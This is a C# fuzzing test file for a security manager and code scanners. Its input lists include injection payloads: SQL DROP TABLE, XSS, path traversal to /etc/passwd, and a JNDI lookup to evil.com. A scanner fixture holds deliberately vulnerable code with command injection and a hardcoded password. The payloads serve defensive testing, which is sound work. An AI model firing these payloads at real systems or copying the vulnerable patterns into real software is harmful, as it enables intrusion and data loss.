using FluentAssertions;
using Occop.SecurityTests.Infrastructure;
using Occop.Core.Security;

namespace Occop.SecurityTests.FuzzingTests
{
    /// <summary>
    /// API模糊测试
    /// API fuzzing tests
    /// </summary>
    public class ApiFuzzingTests : SecurityTestBase
    {
        [Fact]
        public async Task SecurityManager_WithNullInputs_ShouldHandleGracefully()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            // Act & Assert - null SecureString
            await Assert.ThrowsAsync<ArgumentNullException>(async () =>
                await securityManager.StoreSecureDataAsync(null!)
            );

            // Act & Assert - null data ID
            await Assert.ThrowsAsync<ArgumentNullException>(async () =>
                await securityManager.RetrieveSecureDataAsync(null!)
            );
        }

        [Fact]
        public async Task SecurityManager_WithEmptyInputs_ShouldHandleGracefully()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            // Act - empty SecureString
            var emptyString = DataGenerator.CreateSecureString("");
            var result = await securityManager.StoreSecureDataAsync(emptyString);

            // Assert
            result.Should().NotBeNull();
            result.Id.Should().NotBeNullOrEmpty();
        }

        [Fact]
        public async Task SecurityManager_WithSpecialCharacters_ShouldHandleCorrectly()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            var specialChars = new[] { "\0", "\n", "\r", "\t", "\\", "\"", "'", "<>", "[]", "{}", "!@#$%^&*()" };

            // Act & Assert
            foreach (var chars in specialChars)
            {
                var secureString = DataGenerator.CreateSecureString(chars);
                var stored = await securityManager.StoreSecureDataAsync(secureString);
                stored.Should().NotBeNull();

                var retrieved = await securityManager.RetrieveSecureDataAsync(stored.Id);
                retrieved.Should().NotBeNull();

                await securityManager.ClearSecureDataAsync(stored.Id);
            }
        }

        [Fact]
        public async Task SecurityManager_WithUnicodeInputs_ShouldHandleCorrectly()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            var unicodeStrings = new[]
            {
                "Hello 世界",
                "مرحبا العالم",
                "Привет мир",
                "こんにちは世界",
                "🔐🛡️🔒",
                "¡™£¢∞§¶•ªº"
            };

            // Act & Assert
            foreach (var str in unicodeStrings)
            {
                var secureString = DataGenerator.CreateSecureString(str);
                var stored = await securityManager.StoreSecureDataAsync(secureString);
                stored.Should().NotBeNull();

                await securityManager.ClearSecureDataAsync(stored.Id);
            }
        }

        [Fact]
        public async Task SecurityManager_WithExtremelyLongInput_ShouldHandleOrReject()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            // Act - 100KB string
            var largeString = new string('x', 100000);
            var secureString = DataGenerator.CreateSecureString(largeString);

            // 应该能处理或抛出合理的异常
            try
            {
                var stored = await securityManager.StoreSecureDataAsync(secureString);
                stored.Should().NotBeNull();
                await securityManager.ClearSecureDataAsync(stored.Id);
            }
            catch (ArgumentException)
            {
                // 可接受的行为 - 输入太大
                Assert.True(true);
            }
        }

        [Fact]
        public async Task SecurityManager_WithInvalidDataIds_ShouldHandleGracefully()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            var invalidIds = new[]
            {
                "",
                " ",
                "non_existent_id",
                "invalid-format!@#",
                new string('x', 1000), // 超长ID
                "\0\0\0",
                "../../../etc/passwd",
                "'; DROP TABLE users; --"
            };

            // Act & Assert
            foreach (var id in invalidIds)
            {
                if (string.IsNullOrWhiteSpace(id))
                {
                    await Assert.ThrowsAsync<ArgumentNullException>(async () =>
                        await securityManager.RetrieveSecureDataAsync(id)
                    );
                }
                else
                {
                    var result = await securityManager.RetrieveSecureDataAsync(id);
                    result.Should().BeNull("Invalid IDs should return null");
                }
            }
        }

        [Fact]
        public async Task SecurityManager_WithMalformedSecureString_ShouldNotCrash()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            var malformedInputs = new[]
            {
                "SELECT * FROM users",
                "'; DROP TABLE secrets; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "\u0000\u0000\u0000",
                new string('A', 65536) // 64KB
            };

            // Act & Assert
            foreach (var input in malformedInputs)
            {
                try
                {
                    var secureString = DataGenerator.CreateSecureString(input);
                    var stored = await securityManager.StoreSecureDataAsync(secureString);
                    stored.Should().NotBeNull();
                    await securityManager.ClearSecureDataAsync(stored.Id);
                }
                catch (Exception ex)
                {
                    // 应该抛出适当的异常，而不是崩溃
                    ex.Should().BeAssignableTo<Exception>();
                }
            }
        }

        [Fact]
        public async Task SecurityManager_WithRapidRandomInputs_ShouldRemainStable()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            var random = new Random();
            var errors = 0;

            // Act - 随机模糊测试
            for (int i = 0; i < 200; i++)
            {
                try
                {
                    var length = random.Next(0, 10000);
                    var randomData = GenerateRandomString(random, length);
                    var secureString = DataGenerator.CreateSecureString(randomData);

                    var stored = await securityManager.StoreSecureDataAsync(secureString);
                    await securityManager.ClearSecureDataAsync(stored.Id);
                }
                catch
                {
                    errors++;
                }
            }

            // Assert - 错误率应该很低
            var errorRate = errors / 200.0;
            errorRate.Should().BeLessThan(0.1, "Error rate should be less than 10% for random inputs");
        }

        [Fact]
        public async Task SecurityManager_WithBinaryData_ShouldHandle()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            // Act - 二进制数据模拟
            var binaryData = Convert.ToBase64String(new byte[] { 0, 1, 255, 127, 128, 254 });
            var secureString = DataGenerator.CreateSecureString(binaryData);

            var stored = await securityManager.StoreSecureDataAsync(secureString);

            // Assert
            stored.Should().NotBeNull();
            await securityManager.ClearSecureDataAsync(stored.Id);
        }

        [Fact]
        public async Task VulnerabilityScanner_WithMaliciousPatterns_ShouldDetect()
        {
            // Arrange
            var scanner = new VulnerabilityScanner();

            var maliciousCode = @"
                string sql = ""SELECT * FROM users WHERE id = "" + userId;
                ProcessStartInfo psi = new ProcessStartInfo(""cmd"", ""/c "" + userInput);
                string password = ""hardcoded_password_123"";
                File.ReadAllText(""../../../etc/passwd"");
            ";

            // Act
            var result = scanner.ScanCode(maliciousCode, "test.cs");

            // Assert
            result.Vulnerabilities.Should().NotBeEmpty("Should detect vulnerabilities");
            result.Vulnerabilities.Should().Contain(v => v.Severity == VulnerabilitySeverity.Critical);
        }

        [Fact]
        public async Task SensitiveDataScanner_WithEdgeCases_ShouldHandleCorrectly()
        {
            // Arrange
            var edgeCases = new[]
            {
                "api_key=",
                "password:",
                "JWT",
                "Bearer ",
                "email@",
                "@domain.com",
                "0000-0000-0000-0000",
                "000-00-0000"
            };

            // Act & Assert
            foreach (var edgeCase in edgeCases)
            {
                var result = Scanner.ScanText(edgeCase, "edge_case");
                // 不应该崩溃
                result.Should().NotBeNull();
            }
        }

        [Fact]
        public async Task SecurityManager_WithConcurrentFuzzingInputs_ShouldNotCorrupt()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            var random = new Random();

            // Act - 并发模糊测试
            var tasks = Enumerable.Range(0, 100).Select(i => Task.Run(async () =>
            {
                var randomData = GenerateRandomString(random, random.Next(10, 1000));
                var secureString = DataGenerator.CreateSecureString(randomData);

                try
                {
                    var stored = await securityManager.StoreSecureDataAsync(secureString);
                    await Task.Delay(random.Next(1, 10));
                    await securityManager.ClearSecureDataAsync(stored.Id);
                }
                catch
                {
                    // 忽略预期的错误
                }
            }));

            await Task.WhenAll(tasks);

            // Assert - 验证状态完整性
            var validationResult = await securityManager.ValidateSecurityStateAsync();
            validationResult.IsValid.Should().BeTrue();
        }

        [Fact]
        public async Task CleanupTriggers_WithInvalidConfiguration_ShouldHandleGracefully()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var securityManager = TestContext.CreateSecurityManager(securityContext);
            await securityManager.InitializeAsync(securityContext);

            var invalidTriggers = new CleanupTriggers
            {
                OnTimeout = true,
                TimeoutDuration = TimeSpan.FromMilliseconds(-1) // 负数超时
            };

            // Act - 应该处理无效配置
            try
            {
                securityManager.RegisterCleanupTriggers(invalidTriggers);
                Assert.True(true);
            }
            catch (ArgumentException)
            {
                // 可接受的行为
                Assert.True(true);
            }
        }

        [Fact]
        public async Task SecurityAuditor_WithMalformedAuditData_ShouldHandleGracefully()
        {
            // Arrange
            var securityContext = TestContext.CreateSecurityContext();
            var auditor = TestContext.CreateSecurityAuditor(securityContext);

            var malformedData = new Dictionary<string, object>
            {
                { "null_value", null! },
                { "circular_ref", new object() },
                { "special_chars", "!@#$%^&*()\n\r\t" },
                { "unicode", "🔐🛡️💥" }
            };

            // Act & Assert - 不应该崩溃
            try
            {
                var auditId = await auditor.LogSecurityInitializationAsync(
                    "Test with malformed data",
                    malformedData
                );
                auditId.Should().NotBeNullOrEmpty();
            }
            catch (Exception ex)
            {
                // 应该是可预见的异常
                ex.Should().BeAssignableTo<Exception>();
            }
        }

        /// <summary>
        /// 生成随机字符串用于模糊测试
        /// </summary>
        private string GenerateRandomString(Random random, int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>?/~`\n\r\t ";
            return new string(Enumerable.Range(0, length)
                .Select(_ => chars[random.Next(chars.Length)])
                .ToArray());
        }
    }
}
